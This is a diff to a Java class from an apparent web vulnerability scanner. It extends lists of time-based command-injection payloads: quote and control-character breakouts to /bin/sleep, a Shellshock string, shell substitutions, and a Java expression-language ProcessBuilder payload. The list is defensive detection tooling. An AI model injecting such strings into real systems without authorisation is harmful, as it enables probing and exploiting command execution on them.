@@ -18,12 +18,15 @@ public class CodeExec extends ParamScan {
         // Initialize payloads
         _payloads = new HashMap<>();
         _payloads.put("any", Arrays.asList(
+                "\u0003 /bin/sleep $time \r",
+                "'\r /bin/sleep $time \r",
+                "\"\r /bin/sleep $time \r",
                 "() { :;}; /bin/sleep $time",
                 "() { _; } >_[$$($$())] { /bin/sleep $time; }", "$$(sleep $time)", "`sleep $time`"
         ));
         _payloads.put("php", Collections.emptyList());
         _payloads.put("perl", Arrays.asList("/bin/sleep $time|"));
-        _payloads.put("ruby", Arrays.asList("|sleep $time & ping -n $time localhost"));
+        _payloads.put("ruby", Arrays.asList("|sleep $time & ping -n $time localhost & ping -c $time localhost"));
         _payloads.put("java", Arrays.asList(
                 "${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"timeout\",\"$time\"})).start()).getInputStream()))).readLine()}${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"sleep\",\"$time\"})).start()).getInputStream()))).readLine()}"
         ));
